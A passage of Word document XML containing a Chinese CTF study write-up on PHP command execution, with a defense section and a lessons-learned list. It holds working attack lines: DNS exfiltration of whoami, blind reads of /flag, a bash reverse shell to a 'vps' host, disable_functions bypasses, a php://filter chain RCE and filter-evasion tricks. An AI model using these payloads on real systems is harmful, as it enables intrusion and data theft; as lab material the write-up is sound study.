          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ping -c1 $(whoami).dns.com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前提：只放行 DNS 也行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时间盲注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命令：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>if [ $(cut -c1 /flag) = "f" ]; then sleep 3; fi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前提：只能观察耗时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反弹 shell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命令：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>bash -i &gt;&amp; /dev/tcp/vps/4444 0&gt;&amp;1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前提：能出网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3.6.6 禁用函数绕过（10 种）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LD_PRELOAD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putenv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mail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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>mail()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 第 5 参数触发 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sendmail</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">，加载恶意 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.so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前提：能上传 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.so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Apache Mod CGI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原理：上传 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.htaccess</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 启用 CGI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前提：Apache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PHP-FPM / FastCGI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原理：打 FPM 端口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前提：能访问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Shellshock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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>BASH_ENV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 注入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前提：bash &lt; 4.3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imap_open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原理：mailbox 参数注入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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>imap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 扩展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pcntl_exec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原理：常被忘在 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>disable_functions</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 之外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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>pcntl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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Windows COM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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>new COM("WScript.Shell")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前提：Windows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putenv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error_log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原理：同 LD_PRELOAD 思路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bash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enable -f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原理：加载自定义内建命令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win32std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原理：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>win_exec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前提：Windows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3.6.7 文件包含专项：`php://filter` 过滤器链 RCE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场景：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>allow_url_include=Off</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">，无法用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>php://input</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，且不能列目录。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原理：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>convert.iconv.*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 系列编码转换可以"构造"出任意字节。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python3 ~/tools/php_filter_chain_generator.py --chain '&lt;?php system("ls /"); ?&gt;'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输出一条 4600+ 字符的 php://filter/... URL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curl -g "$T/?file=$(...)"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→ 执行 system("ls /")，实测成功列出目录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实测结果：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bin boot dev etc flag_3213 home lib ...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这是"只有 filter 时"的终极解法。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3.7 防御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不拼字符串：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>escapeshellarg()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escapeshellcmd()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白名单：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>filter_var($ip, FILTER_VALIDATE_IP)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不用 shell：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>proc_open</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 传数组（PHP 7.4+ 支持 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>["cmd","arg1"]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禁用函数：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec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最小权限：web 用户不能读 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/flag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>、不能出网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open_basedir：限制可访问目录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危险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$_GET['ip']);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稍好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escapeshellarg($_GET['ip']));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最好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if (!filter_var($_GET['ip'], FILTER_VALIDATE_IP)) { die('invalid'); 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$_GET['ip']);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Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>escapeshellarg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 也不是万能的 —— Windows 上有已知绕过（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>%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 w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>!</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>）。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第四章 总结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4.1 知识地图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任务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├── 环境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└── WSL2 + Kali（工具链：curl / sqlite3 / hg / svn / python3）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├── 信息泄露（5 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├── 版本库类（同一原理，三条差异）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├── Git  → .git/        → 哈希路径 → zlib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├── SVN  → .svn/wc.db   → 哈希路径 → 原文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└── HG   → .hg/         → 文件名编码 → zlib/'u'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├── 备份文件类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└── 源码包 / 后缀变体 / .DS_Store / .env / IDE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└── 编辑器缓存类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    └── vim: .swp / .swo / .un~ / ~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└── 命令执行（3 层）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├── 系统命令函数（8 个：回显 / 返回 / 句柄）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├── 代码执行函数（eval / 回调 / 文件包含）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└── 绕过（6 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空格 → ${IFS}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关键字 → tac / c\at / f?ag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斜杠 → ${PATH:0:1}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分隔符 → ; / %0a / |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编码 → base64 / hex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└── 禁用函数 → LD_PRELOAD / 伪协议链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4.2 踩坑清单（23 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python GitHack.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 报 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>can't open file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教训：Kali 上 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 就是 Python3，GitHack 要 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>python2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坑：GitHack </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ModuleNotFoundError: urlparse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教训：它是 2017 年的 Py2 代码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fatal: not a git repository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教训：在工具目录而非 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>dist/&lt;目标&gt;/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cd dist/$T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 找不到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教训：目录名是 netloc 的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>: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_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">，且去掉 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>http://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wget --cut-dirs=1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 削掉了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.git</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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教训：产物目录本身就是 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.git</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">，要 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>mv dumped repo/.git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--cc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 出不来内容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教训：是我 grep 正则 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>^[+-][^+-]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 排除了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>++</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 前缀，不是 git 的问题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坑：凭"index 有 3 个条目"判成 Index 题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教训：HEAD tree 也是 3 个，差集为空 —— 判据要算差集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8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curl .svn/wc.db</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 报二进制警告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教训：二进制文件必须 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-o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9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坑：只看 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>NODES</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 漏掉被删文件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教训：要看 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>PRISTINE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refcount = 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10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.hg/store/data/flag_xxx.txt.i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> → 404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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 要转义成 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>__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坑：revlog 解压报 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>incomplete stream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教训：首字节 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>'u'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 原文，不是 zlib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rip-hg.pl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 报 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>cannot find hg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教训：要先 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>apt install mercurial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ghproxy.net</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 502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教训：换 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>gh-proxy.com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14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坑：HackBar 里 body 被 URL 编码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教训：看到 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>%3C%3Fphp...</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 编码了；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>php://input</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 不解码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15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-G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 把 body 变成 URL 参数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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>php://input</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 就没 body 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16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eval</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里漏分号 → 空白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教训：PHP 语句要 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">（除非后面跟 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>?&gt;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17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空白 = 输出走了 stderr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教训：加 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>2&gt;&amp;1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 看错误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18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c?t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 命令不存在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教训：通配符只在"所在目录"匹配，必须写 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/bin/c?t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19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cat flag_is_here/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 空白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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>cat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的是目录 → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Is a directory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坑：curl 吃掉 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>${PATH:0:1}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的花括号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教训：URL globbing！加 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-g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21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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>--data-urlencode</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 把 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>%0a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
